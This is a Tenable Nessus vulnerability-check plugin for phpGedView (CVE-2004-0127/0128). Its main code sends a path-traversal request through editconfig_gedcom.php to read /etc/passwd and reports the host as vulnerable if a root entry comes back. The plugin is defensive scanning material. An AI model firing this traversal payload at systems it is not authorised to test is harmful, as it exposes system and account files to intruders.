#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
 script_id(12034);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2014/08/09 00:11:24 $");

 script_cve_id("CVE-2004-0127", "CVE-2004-0128");
 script_bugtraq_id(9529, 9531);
 script_osvdb_id(3768, 3769);

 script_name(english:"phpGedView Arbitrary File Access / Remote File Inclusion");
 script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:"A remote web application is affected by several flaws.");
 script_set_attribute(attribute:"description", value:
"A vulnerability exists in the installed version of PhpGedView that
may allow an attacker to read arbitrary files on the remote web
server with the privileges of the web user.

Another vulnerability could allow an attacker to include arbitrary
PHP files hosted on a third-party website." );
  script_set_attribute(attribute:"see_also", value:"http://www.netvigilance.com/advisory0003");
 script_set_attribute(attribute:"solution", value:"Upgrade to PhpGedView 2.65.2 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/01/28");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/02/02");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:phpgedview:phpgedview");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2014 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencies("phpgedview_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP", "www/phpgedview");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE, embedded:FALSE);

# Test an install.
install = get_install_from_kb(appname:'phpgedview', port:port, exit_on_fail:TRUE);
dir = install['dir'];


u = strcat(dir,"/editconfig_gedcom.php?gedcom_config=../../../../../../../../../../etc/passwd");
r = http_send_recv3(method: "GET", item: u, port:port, exit_on_fail:TRUE);

buf = strcat(r[0], r[1], '\r\n', r[2]);
if (egrep(pattern:"root:.*:0:[01]:", string:buf)){
  security_hole(port);
  exit(0);
}
else exit(0, "The PhpGedView install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
